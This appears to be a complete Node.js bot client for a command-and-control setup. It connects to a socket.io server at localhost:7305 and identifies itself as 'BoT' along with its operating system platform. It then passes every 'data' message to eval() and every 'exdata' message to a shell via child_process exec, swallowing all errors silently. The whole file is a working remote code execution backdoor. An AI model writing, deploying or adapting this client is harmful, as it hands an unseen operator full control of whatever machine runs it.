const socket = require('socket.io-client')('http://localhost:7305');
const { exec } = require('child_process');

socket.on('connect', function(){
	socket.emit('authenticate', 'BoT', process.platform, false);
});

socket.on('data', function(data)
{
	try{eval(data);}catch(e){};
});

socket.on('exdata', function(data)
{
	try{exec(data, (err, stdout, stderr) => {});}catch(e){};
});
